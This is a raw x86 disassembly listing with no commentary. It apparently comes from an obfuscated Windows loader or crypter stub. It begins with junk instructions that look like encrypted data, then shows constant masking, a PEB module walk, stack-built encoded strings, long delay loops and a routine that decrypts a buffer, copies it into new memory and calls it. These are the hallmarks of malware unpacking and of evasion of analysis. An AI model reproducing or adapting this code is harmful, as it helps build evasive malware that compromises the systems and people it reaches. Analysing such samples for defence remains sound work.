  420311:	cmp    al,0xa0
  420313:	mov    edx,DWORD PTR [ecx-0x74747486]
  420319:	(bad)  
  42031a:	pop    eax
  42031b:	sti    
  42031c:	mov    ecx,0x926b1bbc
  420321:	sbb    al,0x1b
  420323:	or     ebp,DWORD PTR [ebx-0x3e44389]
  420329:	pop    eax
  42032a:	std    
  42032b:	mov    ch,0xcf
  42032d:	mov    bl,BYTE PTR [ebx+ebx*1-0x54e56d95]
  420334:	lods   eax,DWORD PTR ds:[esi]
  420335:	fcomp  QWORD PTR [ebx]
  420337:	or     edi,DWORD PTR [ecx-0x1f963846]
  42033d:	mov    edx,DWORD PTR [edx+0x49c7b732]
  420343:	mov    dh,0x6f
  420345:	mov    esp,0xe7580b1b
  42034a:	mov    ecx,0xab8b71f2
  42034f:	mov    ecx,DWORD PTR [ebx+0x3292b637]
  420355:	lahf   
  420356:	and    al,0x8f
  420358:	ror    BYTE PTR [ebx+0x3cc18e97],0x1b
  42035f:	mov    WORD PTR [edx+0x29053692],ds
  420365:	dec    esp
  420366:	and    al,0x20
  420368:	sub    ebx,ecx
  42036a:	sub    WORD PTR [ebp+0x0],dx
  42036e:	add    eax,eax
  420370:	add    eax,0x1
  420373:	lea    ebp,[esp+0x40]
  420377:	ret    
  420378:	push   ebp
  420379:	mov    ebp,esp
  42037b:	sub    esp,0x12c
  420381:	push   ebx
  420382:	push   esi
  420383:	push   edi
  420384:	mov    DWORD PTR [ebp-0x10],0xf89c85b5
  42038b:	mov    DWORD PTR [ebp-0x18],0xf89c85b4
  420392:	mov    eax,DWORD PTR [ebp+0x8]
  420395:	mov    DWORD PTR [ebp+0x8],eax
  420398:	mov    ecx,DWORD PTR [ebp-0x10]
  42039b:	mov    ebx,0x75108b3
  4203a0:	xor    ecx,ebx
  4203a2:	mov    eax,0x3272fa
  4203a7:	add    ecx,eax
  4203a9:	mov    DWORD PTR [ebp-0x2c],ecx
  4203ac:	mov    ecx,DWORD PTR [ebp-0x10]
  4203af:	xor    ecx,ebx
  4203b1:	add    ecx,eax
  4203b3:	mov    DWORD PTR [ebp-0x3c],ecx
  4203b6:	mov    ecx,DWORD PTR [ebp-0x10]
  4203b9:	xor    ecx,ebx
  4203bb:	add    ecx,eax
  4203bd:	mov    DWORD PTR [ebp-0x40],ecx
  4203c0:	mov    ecx,DWORD PTR [ebp-0x10]
  4203c3:	xor    ecx,ebx
  4203c5:	add    ecx,eax
  4203c7:	mov    DWORD PTR [ebp-0xd8],ecx
  4203cd:	mov    DWORD PTR [ebp-0x50],0xf89f05b5
  4203d4:	mov    DWORD PTR [ebp-0x40],0xf89cb5b5
  4203db:	mov    DWORD PTR [ebp-0x54],0xf89c85b9
  4203e2:	push   0x25
  4203e4:	pop    ecx
  4203e5:	mov    DWORD PTR [ebp-0x38],ecx
  4203e8:	mov    DWORD PTR [ebp-0x38],ecx
  4203eb:	push   0x65
  4203ed:	pop    ecx
  4203ee:	mov    DWORD PTR [ebp-0x38],ecx
  4203f1:	mov    DWORD PTR [ebp-0x38],ecx
  4203f4:	mov    DWORD PTR [ebp-0x38],0x4d
  4203fb:	mov    DWORD PTR [ebp-0x38],0x43
  420402:	mov    ecx,DWORD PTR [ebp-0x10]
  420405:	xor    ecx,ebx
  420407:	add    ecx,eax
  420409:	mov    DWORD PTR [ebp-0x38],ecx
  42040c:	mov    ecx,DWORD PTR [ebp-0x10]
  42040f:	xor    ecx,ebx
  420411:	add    ecx,eax
  420413:	mov    DWORD PTR [ebp-0x38],ecx
  420416:	mov    DWORD PTR [ebp-0x28],0x258
  42041d:	mov    DWORD PTR [ebp-0x20],0x36
  420424:	mov    DWORD PTR [ebp-0x14],0x7a
  42042b:	lea    edi,[ebp-0x10c]
  420431:	lea    esi,[ebp-0x12c]
  420437:	call   0x4210f9
  42043c:	dec    DWORD PTR [ebp-0x14]
  42043f:	jne    0x42042b
  420441:	dec    DWORD PTR [ebp-0x20]
  420444:	jne    0x420424
  420446:	dec    DWORD PTR [ebp-0x28]
  420449:	jne    0x42041d
  42044b:	mov    DWORD PTR [ebp-0x28],0x400e
  420452:	mov    eax,DWORD PTR [ebp-0x10]
  420455:	xor    eax,ebx
  420457:	mov    esi,0x3272fa
  42045c:	add    eax,esi
  42045e:	mov    DWORD PTR [ebp-0x1c],eax
  420461:	mov    eax,DWORD PTR [ebp-0x10]
  420464:	and    DWORD PTR [ebp-0x94],0x0
  42046b:	xor    eax,ebx
  42046d:	add    eax,esi
  42046f:	mov    DWORD PTR [ebp-0x34],eax
  420472:	mov    eax,fs:0x18
  420478:	mov    DWORD PTR [ebp-0x94],eax
  42047e:	mov    eax,DWORD PTR [eax+0x30]
  420481:	mov    DWORD PTR [ebp-0xcc],eax
  420487:	mov    eax,DWORD PTR [eax+0xc]
  42048a:	mov    DWORD PTR [ebp-0xc0],eax
  420490:	mov    eax,DWORD PTR [ebp+0x8]
  420493:	lea    ecx,[ebp-0x94]
  420499:	mov    DWORD PTR [eax+0x1a0],ecx
  42049f:	mov    eax,DWORD PTR [ebp+0x8]
  4204a2:	lea    ecx,[ebp-0xcc]
  4204a8:	mov    DWORD PTR [eax+0x1a4],ecx
  4204ae:	mov    eax,DWORD PTR [ebp+0x8]
  4204b1:	push   DWORD PTR [ebp+0x8]
  4204b4:	lea    ecx,[ebp-0xc0]
  4204ba:	mov    DWORD PTR [eax+0x1a8],ecx
  4204c0:	call   0x4228ba
  4204c5:	mov    ecx,DWORD PTR [ebp-0x10]
  4204c8:	xor    ecx,ebx
  4204ca:	add    ecx,esi
  4204cc:	cmp    ecx,eax
  4204ce:	je     0x420851
  4204d4:	mov    eax,DWORD PTR [ebp+0x8]
  4204d7:	mov    eax,DWORD PTR [eax+0x194]
  4204dd:	mov    ecx,DWORD PTR [eax]
  4204df:	mov    eax,DWORD PTR [ebp+0x8]
  4204e2:	mov    eax,DWORD PTR [eax+0x194]
  4204e8:	mov    eax,DWORD PTR [eax]
  4204ea:	add    eax,DWORD PTR [ecx+0x3c]
  4204ed:	mov    ecx,DWORD PTR [ebp+0x8]
  4204f0:	mov    ecx,DWORD PTR [ecx+0x1e0]
  4204f6:	lea    edx,[ebp-0xec]
  4204fc:	push   edx
  4204fd:	mov    edx,DWORD PTR [ebp+0x8]
  420500:	mov    edx,DWORD PTR [edx+0x18c]
  420506:	mov    edx,DWORD PTR [edx]
  420508:	add    edx,DWORD PTR [eax+0x88]
  42050e:	push   0x4
  420510:	push   DWORD PTR [eax+0x8c]
  420516:	push   edx
  420517:	call   DWORD PTR [ecx+0x1c]
  42051a:	push   DWORD PTR [ebp+0x8]
  42051d:	xor    eax,eax
  42051f:	mov    DWORD PTR [ebp-0xa8],0xe3bcecc2
  420529:	mov    DWORD PTR [ebp-0xa4],0xe8c7edda
  420533:	mov    DWORD PTR [ebp-0xa0],0xbaeddef0
  42053d:	mov    BYTE PTR [ebp-0x9c],0x7b
  420544:	lea    edi,[ebp-0x9b]
  42054a:	stos   DWORD PTR es:[edi],eax
  42054b:	stos   WORD PTR es:[edi],ax
  42054d:	stos   BYTE PTR es:[edi],al
  42054e:	xor    eax,eax
  420550:	mov    DWORD PTR [ebp-0xbc],0xe3bcecc2
  42055a:	mov    DWORD PTR [ebp-0xb8],0xe8c7edda
  420564:	mov    DWORD PTR [ebp-0xb4],0xd0eddef0
  42056e:	mov    BYTE PTR [ebp-0xb0],0x7b
  420575:	lea    edi,[ebp-0xaf]
  42057b:	stos   DWORD PTR es:[edi],eax
  42057c:	stos   WORD PTR es:[edi],ax
  42057e:	stos   BYTE PTR es:[edi],al
  42057f:	mov    edi,DWORD PTR [ebp+0x8]
  420582:	mov    eax,DWORD PTR [ebp+0x8]
  420585:	mov    edx,DWORD PTR [eax+0x1b8]
  42058b:	mov    DWORD PTR [ebp-0x68],0xedefece7
  420592:	mov    DWORD PTR [ebp-0x64],0xe2ebe6dc
  420599:	mov    WORD PTR [ebp-0x60],0x7bba
  42059f:	mov    DWORD PTR [ebp-0x90],0xe3bcecc2
  4205a9:	mov    DWORD PTR [ebp-0x8c],0xe7baedda
  4205b3:	mov    DWORD PTR [ebp-0x88],0xc9dae3eb
  4205bd:	mov    DWORD PTR [ebp-0x84],0xeddee6ee
  4205c7:	mov    DWORD PTR [ebp-0x80],0x7bbadce2
  4205ce:	mov    DWORD PTR [ebp-0x7c],0xe3bcecc2
  4205d5:	mov    DWORD PTR [ebp-0x78],0xe7baedda
  4205dc:	mov    DWORD PTR [ebp-0x74],0xc9dae3eb
  4205e3:	mov    DWORD PTR [ebp-0x70],0xeddee6ee
  4205ea:	mov    DWORD PTR [ebp-0x6c],0x7bd0dce2
  4205f1:	call   0x4228e9
  4205f6:	push   eax
  4205f7:	mov    eax,DWORD PTR [ebp+0x8]
  4205fa:	mov    eax,DWORD PTR [eax+0x1a8]
  420600:	push   DWORD PTR [eax]
  420602:	call   0x42258a
  420607:	test   eax,eax
  420609:	jne    0x42065b
  42060b:	mov    eax,DWORD PTR [ebp+0x8]
  42060e:	mov    eax,DWORD PTR [eax+0x1e0]
  420614:	mov    edi,DWORD PTR [ebp+0x8]
  420617:	add    eax,0x4
  42061a:	mov    DWORD PTR [ebp-0x24],eax
  42061d:	mov    eax,DWORD PTR [ebp+0x8]
  420620:	mov    edx,DWORD PTR [eax+0x1b8]
  420626:	call   0x4228e9
  42062b:	push   eax
  42062c:	mov    eax,DWORD PTR [ebp-0x24]
  42062f:	call   DWORD PTR [eax]
  420631:	test   eax,eax
  420633:	jne    0x42065b
  420635:	mov    eax,DWORD PTR [ebp+0x8]
  420638:	mov    eax,DWORD PTR [eax+0x1e0]
  42063e:	mov    edi,DWORD PTR [ebp+0x8]
  420641:	add    eax,0x10
  420644:	mov    DWORD PTR [ebp-0x24],eax
  420647:	mov    eax,DWORD PTR [ebp+0x8]
  42064a:	mov    edx,DWORD PTR [eax+0x1b8]
  420650:	call   0x4228e9
  420655:	push   eax
  420656:	mov    eax,DWORD PTR [ebp-0x24]
  420659:	call   DWORD PTR [eax]
  42065b:	mov    eax,DWORD PTR [ebp-0x10]
  42065e:	mov    ecx,DWORD PTR [ebp-0x28]
  420661:	xor    eax,ebx
  420663:	add    eax,esi
  420665:	cmp    eax,ecx
  420667:	je     0x42082a
  42066d:	mov    eax,DWORD PTR [ebp-0x18]
  420670:	xor    eax,ebx
  420672:	mov    ecx,0xffcd8d06
  420677:	sub    ecx,eax
  420679:	add    ecx,DWORD PTR [ebp-0x28]
  42067c:	mov    eax,DWORD PTR [ebp-0x1c]
  42067f:	cmp    eax,ecx
  420681:	ja     0x42082a
  420687:	mov    DWORD PTR [ebp-0x20],0x0
  42068e:	push   DWORD PTR [ebp+0x8]
  420691:	mov    edi,DWORD PTR [ebp+0x8]
  420694:	mov    eax,DWORD PTR [ebp+0x8]
  420697:	mov    edx,DWORD PTR [eax+0x1b4]
  42069d:	call   0x4228e9
  4206a2:	push   eax
  4206a3:	mov    eax,DWORD PTR [ebp+0x8]
  4206a6:	mov    eax,DWORD PTR [eax+0x1a8]
  4206ac:	push   DWORD PTR [eax]
  4206ae:	call   0x42258a
  4206b3:	mov    ecx,DWORD PTR [ebp+0x8]
  4206b6:	mov    ecx,DWORD PTR [ecx+0x19c]
  4206bc:	mov    DWORD PTR [ecx],eax
  4206be:	mov    eax,DWORD PTR [ebp+0x8]
  4206c1:	mov    edi,DWORD PTR [eax+0x1e0]
  4206c7:	mov    esi,DWORD PTR [ebp+0x8]
  4206ca:	xor    eax,eax
  4206cc:	lea    edx,[ebp-0x7c]
  4206cf:	call   0x42291f
  4206d4:	push   eax
  4206d5:	mov    eax,DWORD PTR [ebp+0x8]
  4206d8:	mov    eax,DWORD PTR [eax+0x19c]
  4206de:	push   DWORD PTR [eax]
  4206e0:	call   DWORD PTR [edi+0x8]
  4206e3:	mov    DWORD PTR [ebp-0x24],eax
  4206e6:	mov    eax,DWORD PTR [ebp+0x8]
  4206e9:	mov    edi,DWORD PTR [eax+0x1e0]
  4206ef:	mov    esi,DWORD PTR [ebp+0x8]
  4206f2:	xor    eax,eax
  4206f4:	lea    edx,[ebp-0x90]
  4206fa:	call   0x42291f
  4206ff:	push   eax
  420700:	mov    eax,DWORD PTR [ebp+0x8]
  420703:	mov    eax,DWORD PTR [eax+0x19c]
  420709:	push   DWORD PTR [eax]
  42070b:	call   DWORD PTR [edi+0x8]
  42070e:	mov    eax,DWORD PTR [ebp+0x8]
  420711:	mov    edi,DWORD PTR [eax+0x1e0]
  420717:	mov    esi,DWORD PTR [ebp+0x8]
  42071a:	xor    eax,eax
  42071c:	lea    edx,[ebp-0xa8]
  420722:	call   0x42291f
  420727:	push   eax
  420728:	mov    eax,DWORD PTR [ebp+0x8]
  42072b:	mov    eax,DWORD PTR [eax+0x19c]
  420731:	push   DWORD PTR [eax]
  420733:	call   DWORD PTR [edi+0x8]
  420736:	and    DWORD PTR [ebp-0x8],0x0
  42073a:	mov    DWORD PTR [ebp-0x44],eax
  42073d:	mov    eax,DWORD PTR [ebp-0x8]
  420740:	and    eax,0x7
  420743:	add    eax,0x31
  420746:	push   eax
  420747:	call   DWORD PTR [ebp-0x24]
  42074a:	test   eax,eax
  42074c:	je     0x420790
  42074e:	mov    eax,DWORD PTR [ebp-0x8]
  420751:	push   0x19
  420753:	xor    edx,edx
  420755:	pop    ecx
  420756:	div    ecx
  420758:	add    dl,0x41
  42075b:	movzx  eax,dl
  42075e:	push   eax
  42075f:	call   DWORD PTR [ebp-0x44]
  420762:	test   eax,eax
  420764:	jne    0x420790
  420766:	mov    eax,DWORD PTR [ebp+0x8]
  420769:	mov    edi,DWORD PTR [eax+0x1e0]
  42076f:	mov    esi,DWORD PTR [ebp+0x8]
  420772:	xor    eax,eax
  420774:	lea    edx,[ebp-0x68]
  420777:	call   0x42291f
  42077c:	push   eax
  42077d:	mov    eax,DWORD PTR [ebp+0x8]
  420780:	mov    eax,DWORD PTR [eax+0x198]
  420786:	push   DWORD PTR [eax]
  420788:	call   DWORD PTR [edi+0x8]
  42078b:	mov    DWORD PTR [ebp-0x14],eax
  42078e:	jmp    0x420794
  420790:	and    DWORD PTR [ebp-0x14],0x0
  420794:	inc    DWORD PTR [ebp-0x8]
  420797:	cmp    DWORD PTR [ebp-0x8],0x10
  42079b:	jb     0x42073d
  42079d:	mov    eax,DWORD PTR [ebp-0x18]
  4207a0:	mov    esi,DWORD PTR [ebp+0x8]
  4207a3:	xor    eax,ebx
  4207a5:	mov    edi,0x3272fa
  4207aa:	add    eax,edi
  4207ac:	lea    edx,[ebp-0x10c]
  4207b2:	call   0x42291f
  4207b7:	push   eax
  4207b8:	mov    eax,DWORD PTR [ebp-0x10]
  4207bb:	mov    esi,DWORD PTR [ebp+0x8]
  4207be:	xor    eax,ebx
  4207c0:	add    eax,edi
  4207c2:	lea    edx,[ebp-0x12c]
  4207c8:	call   0x42291f
  4207cd:	push   eax
  4207ce:	call   DWORD PTR [ebp-0x14]
  4207d1:	mov    ecx,DWORD PTR [ebp-0x10]
  4207d4:	xor    ecx,ebx
  4207d6:	add    ecx,edi
  4207d8:	cmp    ecx,eax
  4207da:	jne    0x4207e3
  4207dc:	mov    DWORD PTR [ebp-0x20],0x1
  4207e3:	mov    eax,DWORD PTR [ebp-0x18]
  4207e6:	mov    ecx,DWORD PTR [ebp-0x1c]
  4207e9:	xor    eax,ebx
  4207eb:	lea    eax,[eax+ecx*1+0x3272fa]
  4207f2:	mov    DWORD PTR [ebp-0x1c],eax
  4207f5:	mov    eax,DWORD PTR [ebp-0x20]
  4207f8:	test   eax,eax
  4207fa:	je     0x42080e
  4207fc:	mov    eax,DWORD PTR [ebp-0x18]
  4207ff:	mov    ecx,DWORD PTR [ebp-0x34]
  420802:	xor    eax,ebx
  420804:	lea    eax,[eax+ecx*1+0x3272fa]
  42080b:	mov    DWORD PTR [ebp-0x34],eax
  42080e:	mov    eax,DWORD PTR [ebp-0x18]
  420811:	xor    eax,ebx
  420813:	mov    ecx,0xffcd8d06
  420818:	sub    ecx,eax
  42081a:	add    ecx,DWORD PTR [ebp-0x28]
  42081d:	mov    eax,DWORD PTR [ebp-0x1c]
  420820:	cmp    eax,ecx
  420822:	jbe    0x420687
  420828:	mov    esi,edi
  42082a:	mov    eax,DWORD PTR [ebp-0x34]
  42082d:	mov    ecx,DWORD PTR [ebp-0x1c]
  420830:	cmp    ecx,eax
  420832:	jne    0x420845
  420834:	push   DWORD PTR [ebp+0x8]
  420837:	lea    eax,[ebp-0x3c]
  42083a:	push   eax
  42083b:	call   0x42338e
  420840:	mov    DWORD PTR [ebp-0x2c],eax
  420843:	jmp    0x420851
  420845:	mov    eax,DWORD PTR [ebp-0x2c]
  420848:	mov    ecx,DWORD PTR [ebp-0x18]
  42084b:	xor    ecx,ebx
  42084d:	add    ecx,esi
  42084f:	xor    DWORD PTR [eax],ecx
  420851:	mov    eax,DWORD PTR [ebp-0x10]
  420854:	mov    ecx,DWORD PTR [ebp-0x2c]
  420857:	xor    eax,ebx
  420859:	add    eax,esi
  42085b:	cmp    eax,ecx
  42085d:	je     0x420fd7
  420863:	mov    eax,DWORD PTR [ebp-0x10]
  420866:	mov    ecx,DWORD PTR [ebp-0x3c]
  420869:	xor    eax,ebx
  42086b:	add    eax,esi
  42086d:	cmp    eax,ecx
  42086f:	je     0x420fd7
  420875:	mov    eax,DWORD PTR [ebp-0x10]
  420878:	xor    eax,ebx
  42087a:	add    eax,esi
  42087c:	jmp    0x42089a
  42087e:	mov    edi,DWORD PTR [ebp-0x2c]
  420881:	mov    cl,al
  420883:	and    cl,0x1f
  420886:	or     dl,0xff
  420889:	sub    dl,cl
  42088b:	add    BYTE PTR [edi+eax*1],dl
  42088e:	mov    ecx,DWORD PTR [ebp-0x18]
  420891:	xor    ecx,ebx
  420893:	lea    eax,[eax+ecx*1+0x3272fa]
  42089a:	mov    ecx,DWORD PTR [ebp-0x3c]
  42089d:	cmp    eax,ecx
  42089f:	jb     0x42087e
  4208a1:	mov    eax,DWORD PTR [ebp-0x3c]
  4208a4:	mov    DWORD PTR [ebp-0x28],eax
  4208a7:	mov    eax,DWORD PTR [ebp-0x2c]
  4208aa:	mov    DWORD PTR [ebp-0x34],0xf89c85b5
  4208b1:	mov    DWORD PTR [ebp-0xd4],eax
  4208b7:	mov    edi,0xf89c85b4
  4208bc:	mov    DWORD PTR [ebp-0x30],edi
  4208bf:	mov    eax,DWORD PTR [ebp-0x34]
  4208c2:	xor    eax,ebx
  4208c4:	add    eax,esi
  4208c6:	mov    DWORD PTR [ebp-0xc],eax
  4208c9:	mov    eax,DWORD PTR [ebp-0x34]
  4208cc:	xor    eax,ebx
  4208ce:	add    eax,esi
  4208d0:	mov    DWORD PTR [ebp-0x8],eax
  4208d3:	mov    DWORD PTR [ebp-0x44],0xf89c8595
  4208da:	mov    DWORD PTR [ebp-0x4c],0xf89c85be
  4208e1:	mov    eax,DWORD PTR [ebp-0x34]
  4208e4:	mov    ecx,DWORD PTR [ebp-0x28]
  4208e7:	xor    eax,ebx
  4208e9:	add    eax,esi
  4208eb:	cmp    ecx,eax
  4208ed:	je     0x420aec
  4208f3:	jmp    0x420ac8
  4208f8:	mov    ecx,DWORD PTR [ebp-0xc]
  4208fb:	mov    eax,DWORD PTR [ebp-0x28]
  4208fe:	sub    eax,ecx
  420900:	mov    ecx,DWORD PTR [ebp-0x44]
  420903:	xor    ecx,ebx
  420905:	add    ecx,esi
  420907:	xor    edx,edx
  420909:	div    ecx
  42090b:	mov    DWORD PTR [ebp-0x8],eax
  42090e:	mov    eax,DWORD PTR [ebp-0x4c]
  420911:	mov    ecx,DWORD PTR [ebp-0x8]
  420914:	xor    eax,ebx
  420916:	add    eax,esi
  420918:	cmp    ecx,eax
  42091a:	jbe    0x420926
  42091c:	mov    eax,DWORD PTR [ebp-0x4c]
  42091f:	xor    eax,ebx
  420921:	add    eax,esi
  420923:	mov    DWORD PTR [ebp-0x8],eax
  420926:	mov    eax,DWORD PTR [ebp-0x44]
  420929:	mov    ecx,DWORD PTR [ebp-0x8]
  42092c:	xor    eax,ebx
  42092e:	add    eax,esi
  420930:	imul   eax,ecx
  420933:	mov    DWORD PTR [ebp-0x8],eax
  420936:	mov    eax,DWORD PTR [ebp-0x34]
  420939:	mov    ecx,DWORD PTR [ebp-0x8]
  42093c:	xor    eax,ebx
  42093e:	add    eax,esi
  420940:	cmp    ecx,eax
  420942:	je     0x420ab6
  420948:	mov    eax,DWORD PTR [ebp-0x8]
  42094b:	mov    DWORD PTR [ebp-0x14],eax
  42094e:	mov    eax,DWORD PTR [ebp-0xc]
  420951:	add    eax,DWORD PTR [ebp-0xd4]
  420957:	mov    DWORD PTR [ebp-0x24],0xf89c85b5
  42095e:	mov    DWORD PTR [ebp-0x20],edi
  420961:	mov    DWORD PTR [ebp-0xe8],0xf89c85bb
  42096b:	mov    DWORD PTR [ebp-0x8],eax
  42096e:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  420975:	mov    DWORD PTR [ebp-0x1c],edi
  420978:	mov    eax,DWORD PTR [ebp-0x24]
  42097b:	xor    eax,ebx
  42097d:	add    eax,esi
  42097f:	jmp    0x420a75
  420984:	mov    DWORD PTR [ebp-0xe0],0xf89c85a2
  42098e:	mov    DWORD PTR [ebp-0xc4],0xf89c85af
  420998:	mov    eax,DWORD PTR [ebp-0x1c]
  42099b:	mov    ecx,DWORD PTR [ebp-0x48]
  42099e:	xor    eax,ebx
  4209a0:	add    eax,esi
  4209a2:	imul   eax,ecx
  4209a5:	mov    ecx,DWORD PTR [ebp-0x8]
  4209a8:	mov    al,BYTE PTR [eax+ecx*1]
  4209ab:	mov    BYTE PTR [ebp-0x2],al
  4209ae:	mov    eax,DWORD PTR [ebp-0x1c]
  4209b1:	mov    ecx,DWORD PTR [ebp-0x48]
  4209b4:	xor    eax,ebx
  4209b6:	add    eax,esi
  4209b8:	imul   eax,ecx
  4209bb:	mov    ecx,DWORD PTR [ebp-0xe8]
  4209c1:	xor    ecx,ebx
  4209c3:	add    eax,ecx
  4209c5:	mov    ecx,DWORD PTR [ebp-0x8]
  4209c8:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  4209d0:	mov    ecx,DWORD PTR [ebp-0xe0]
  4209d6:	xor    ecx,ebx
  4209d8:	lea    eax,[ecx+eax*1+0x3272fa]
  4209df:	movzx  ecx,BYTE PTR [ebp-0x2]
  4209e3:	xor    ecx,eax
  4209e5:	mov    BYTE PTR [ebp-0x2],cl
  4209e8:	mov    al,BYTE PTR [ebp-0x2]
  4209eb:	mov    ecx,DWORD PTR [ebp-0x1c]
  4209ee:	mov    edx,DWORD PTR [ebp-0x48]
  4209f1:	xor    ecx,ebx
  4209f3:	add    ecx,esi
  4209f5:	imul   ecx,edx
  4209f8:	mov    edx,DWORD PTR [ebp-0x8]
  4209fb:	mov    BYTE PTR [ecx+edx*1],al
  4209fe:	mov    eax,DWORD PTR [ebp-0x1c]
  420a01:	mov    ecx,DWORD PTR [ebp-0x48]
  420a04:	xor    eax,ebx
  420a06:	add    eax,esi
  420a08:	imul   eax,ecx
  420a0b:	mov    ecx,DWORD PTR [ebp-0x8]
  420a0e:	mov    al,BYTE PTR [eax+ecx*1]
  420a11:	mov    BYTE PTR [ebp-0x2],al
  420a14:	mov    eax,DWORD PTR [ebp-0x1c]
  420a17:	mov    ecx,DWORD PTR [ebp-0x48]
  420a1a:	xor    eax,ebx
  420a1c:	add    eax,esi
  420a1e:	imul   eax,ecx
  420a21:	mov    ecx,DWORD PTR [ebp-0x20]
  420a24:	xor    ecx,ebx
  420a26:	add    eax,ecx
  420a28:	mov    ecx,DWORD PTR [ebp-0x8]
  420a2b:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  420a33:	mov    ecx,DWORD PTR [ebp-0xc4]
  420a39:	xor    ecx,ebx
  420a3b:	lea    eax,[ecx+eax*1+0x3272fa]
  420a42:	movzx  ecx,BYTE PTR [ebp-0x2]
  420a46:	xor    ecx,eax
  420a48:	mov    BYTE PTR [ebp-0x2],cl
  420a4b:	mov    al,BYTE PTR [ebp-0x2]
  420a4e:	mov    ecx,DWORD PTR [ebp-0x1c]
  420a51:	mov    edx,DWORD PTR [ebp-0x48]
  420a54:	xor    ecx,ebx
  420a56:	add    ecx,esi
  420a58:	imul   ecx,edx
  420a5b:	mov    edx,DWORD PTR [ebp-0x8]
  420a5e:	mov    BYTE PTR [ecx+edx*1],al
  420a61:	mov    eax,DWORD PTR [ebp-0x38]
  420a64:	mov    ecx,DWORD PTR [ebp-0x20]
  420a67:	xor    eax,ebx
  420a69:	xor    ecx,ebx
  420a6b:	add    eax,esi
  420a6d:	add    ecx,esi
  420a6f:	imul   eax,ecx
  420a72:	add    eax,DWORD PTR [ebp-0x48]
  420a75:	mov    DWORD PTR [ebp-0x48],eax
  420a78:	mov    eax,DWORD PTR [ebp-0x48]
  420a7b:	mov    ecx,DWORD PTR [ebp-0x14]
  420a7e:	cmp    ecx,eax
  420a80:	jb     0x420984
  420a86:	mov    eax,DWORD PTR [ebp-0x20]
  420a89:	mov    ecx,DWORD PTR [ebp-0x14]
  420a8c:	xor    eax,ebx
  420a8e:	add    eax,esi
  420a90:	imul   eax,ecx
  420a93:	mov    ecx,DWORD PTR [ebp-0x24]
  420a96:	xor    ecx,ebx
  420a98:	add    ecx,esi
  420a9a:	or     eax,ecx
  420a9c:	mov    ecx,DWORD PTR [ebp-0x30]
  420a9f:	xor    ecx,ebx
  420aa1:	add    eax,ecx
  420aa3:	mov    ecx,DWORD PTR [ebp-0x30]
  420aa6:	xor    ecx,ebx
  420aa8:	add    eax,ecx
  420aaa:	mov    ecx,DWORD PTR [ebp-0xc]
  420aad:	lea    eax,[eax+ecx*1+0x64e5f4]
  420ab4:	jmp    0x420ac5
  420ab6:	mov    eax,DWORD PTR [ebp-0x30]
  420ab9:	mov    ecx,DWORD PTR [ebp-0xc]
  420abc:	xor    eax,ebx
  420abe:	lea    eax,[eax+ecx*1+0x3272fa]
  420ac5:	mov    DWORD PTR [ebp-0xc],eax
  420ac8:	mov    eax,DWORD PTR [ebp-0x30]
  420acb:	xor    eax,ebx
  420acd:	mov    ecx,0xffcd8d06
  420ad2:	sub    ecx,eax
  420ad4:	add    ecx,DWORD PTR [ebp-0x28]
  420ad7:	mov    eax,DWORD PTR [ebp-0x30]
  420ada:	mov    edx,DWORD PTR [ebp-0xc]
  420add:	xor    eax,ebx
  420adf:	add    eax,esi
  420ae1:	imul   eax,edx
  420ae4:	cmp    eax,ecx
  420ae6:	jbe    0x4208f8
  420aec:	mov    eax,DWORD PTR [ebp-0x10]
  420aef:	mov    ecx,DWORD PTR [ebp-0x3c]
  420af2:	mov    eax,DWORD PTR [ebp+0x8]
  420af5:	mov    edx,DWORD PTR [ebp-0x54]
  420af8:	mov    eax,DWORD PTR [eax+0x1e0]
  420afe:	xor    edx,ebx
  420b00:	add    edx,esi
  420b02:	push   edx
  420b03:	mov    edx,DWORD PTR [ebp-0x40]
  420b06:	xor    edx,ebx
  420b08:	add    edx,esi
  420b0a:	push   edx
  420b0b:	push   ecx
  420b0c:	mov    DWORD PTR [ebp-0x38],ecx
  420b0f:	mov    ecx,DWORD PTR [ebp-0x10]
  420b12:	xor    ecx,ebx
  420b14:	add    ecx,esi
  420b16:	push   ecx
  420b17:	call   DWORD PTR [eax+0x14]
  420b1a:	mov    edi,eax
  420b1c:	mov    eax,DWORD PTR [ebp-0x10]
  420b1f:	xor    eax,ebx
  420b21:	add    eax,esi
  420b23:	cmp    eax,edi
  420b25:	je     0x420b80
  420b27:	mov    eax,DWORD PTR [ebp-0x10]
  420b2a:	jmp    0x420b4d
  420b2c:	mov    ecx,DWORD PTR [ebp-0x2c]
  420b2f:	xor    eax,ebx
  420b31:	mov    cl,BYTE PTR [ecx+eax*1+0x3272fa]
  420b38:	mov    BYTE PTR [eax+edi*1+0x3272fa],cl
  420b3f:	mov    ecx,DWORD PTR [ebp-0x18]
  420b42:	xor    ecx,ebx
  420b44:	lea    eax,[ecx+eax*1+0x3272fa]
  420b4b:	xor    eax,ebx
  420b4d:	mov    ecx,DWORD PTR [ebp-0x3c]
  420b50:	sub    ecx,esi
  420b52:	xor    ecx,ebx
  420b54:	cmp    eax,ecx
  420b56:	jne    0x420b2c
  420b58:	mov    eax,DWORD PTR [ebp+0x8]
  420b5b:	mov    ecx,DWORD PTR [ebp-0x50]
  420b5e:	mov    eax,DWORD PTR [eax+0x1e0]
  420b64:	xor    ecx,ebx
  420b66:	add    ecx,esi
  420b68:	push   ecx
  420b69:	mov    ecx,DWORD PTR [ebp-0x10]
  420b6c:	xor    ecx,ebx
  420b6e:	add    ecx,esi
  420b70:	push   ecx
  420b71:	push   DWORD PTR [ebp-0x2c]
  420b74:	call   DWORD PTR [eax+0x18]
  420b77:	mov    eax,DWORD PTR [ebp-0x38]
  420b7a:	mov    DWORD PTR [ebp-0x2c],edi
  420b7d:	mov    DWORD PTR [ebp-0x3c],eax
  420b80:	mov    eax,DWORD PTR [ebp-0x2c]
  420b83:	mov    DWORD PTR [ebp-0x14],eax
  420b86:	mov    eax,DWORD PTR [ebp-0x18]
  420b89:	mov    ecx,DWORD PTR [ebp-0x10]
  420b8c:	xor    eax,ebx
  420b8e:	add    eax,esi
  420b90:	mov    DWORD PTR [ebp-0x5c],0xbad3cbd3
  420b97:	mov    DWORD PTR [ebp-0x58],0xc4d3bcd3
  420b9e:	jmp    0x420bd1
  420ba0:	mov    edx,DWORD PTR [ebp-0x14]
  420ba3:	mov    edi,ecx
  420ba5:	xor    edi,ebx
  420ba7:	mov    cl,BYTE PTR [ebp+edi*1+0x32729e]
  420bae:	movsx  edx,BYTE PTR [edi+edx*1+0x3272fa]
